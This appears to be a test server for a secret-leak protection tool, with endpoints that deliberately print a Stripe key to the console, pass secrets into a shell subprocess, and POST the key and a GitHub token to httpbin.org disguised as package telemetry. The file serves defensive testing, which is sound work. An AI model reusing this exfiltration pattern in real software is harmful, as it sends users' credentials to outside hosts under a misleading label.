import express from "express";
import { execSync } from "child_process";
import http from "http";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// 1. Root Greeting
app.get("/", (req, res) => {
  res.json({
    message: "Envtrap Test Express Server is running!",
    endpoints: {
      "GET /": "This overview",
      "GET /leak-console": "Tries to print a Stripe Secret Key to stdout (console)",
      "GET /leak-http": "Tries to exfiltrate a GitHub Token via outbound HTTP request",
      "GET /leak-subprocess": "Tries to spawn a subprocess passing secrets explicitly"
    },
    protectionStatus: process.env.NODE_OPTIONS && process.env.NODE_OPTIONS.includes("envtrap") ? "Protected by envtrap" : "Not Protected"
  });
});

// 2. Outbound Stream Leak (stdout/stderr)
app.get("/leak-console", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO PRINT SECRET TO CONSOLE ===");
  console.log(`Configured Stripe Secret Key: ${process.env.STRIPE_SECRET_KEY}`);
  console.log("====================================================");
  
  res.json({
    status: "Attempted console.log of Stripe key. Check your terminal output to see if it was redacted!",
    secretSampleRef: "sk_live_51Nz..."
  });
});

// 3. Outbound HTTPS/HTTP Leak
app.get("/leak-http", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO SEND SECRET VIA HTTP ===");
  
  const requestOptions = {
    hostname: "httpbin.org",
    port: 80,
    path: "/post",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${process.env.GITHUB_TOKEN}`
    }
  };

  const request = http.request(requestOptions, (response) => {
    let responseData = "";
    response.on("data", (chunk) => { responseData += chunk; });
    response.on("end", () => {
      res.json({
        status: "HTTP request completed successfully (envtrap did not block it).",
        responseData: JSON.parse(responseData)
      });
    });
  });

  request.on("error", (error) => {
    console.error("HTTP Request Error caught inside App handler:", error.message);
    res.status(500).json({
      status: "HTTP request was blocked / failed!",
      error: error.message
    });
  });

  request.write(JSON.stringify({
    telemetry: "npm package analytic report",
    sensitiveData: process.env.STRIPE_SECRET_KEY
  }));
  
  request.end();
});

// 4. Subprocess Execution Leak
app.get("/leak-subprocess", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO SPAWN FORBIDDEN SUBPROCESS ===");
  try {
    const envWithSecrets = {
      ...process.env,
      STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
      GITHUB_TOKEN: process.env.GITHUB_TOKEN
    };
    
    const output = execSync("echo \"Subprocess received Stripe key: $STRIPE_SECRET_KEY\"", {
      env: envWithSecrets,
      encoding: "utf8"
    });
    
    res.json({
      status: "Subprocess execution completed.",
      output: output.trim()
    });
  } catch (error) {
    console.error("Subprocess execution failed / blocked:", error.message);
    res.status(500).json({
      status: "Subprocess execution was blocked!",
      error: error.message
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server started on http://localhost:${PORT}`);
  console.log(`Run 'npm run secure' to test with envtrap protection.`);
});
